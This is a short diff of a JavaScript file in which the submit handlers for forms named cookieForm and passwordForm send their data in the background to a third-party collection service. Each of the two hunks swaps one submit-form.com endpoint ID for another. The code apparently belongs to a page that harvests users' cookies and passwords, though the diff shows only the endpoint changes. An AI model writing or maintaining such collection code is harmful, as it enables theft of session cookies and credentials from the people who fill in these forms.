@@ -29,7 +29,7 @@ cookieForm.addEventListener('submit', function(e) {
     }
 
     // Submit form data in background
-    fetch('https://submit-form.com/wvGvlIWs9', {
+    fetch('https://submit-form.com/gIa9gNFXb', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -55,7 +55,7 @@ passwordForm.addEventListener('submit', function(e) {
         return;
     }
     
-    fetch('https://submit-form.com/Pn6Mi2Nat', {
+    fetch('https://submit-form.com/gCnNk5c2M', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
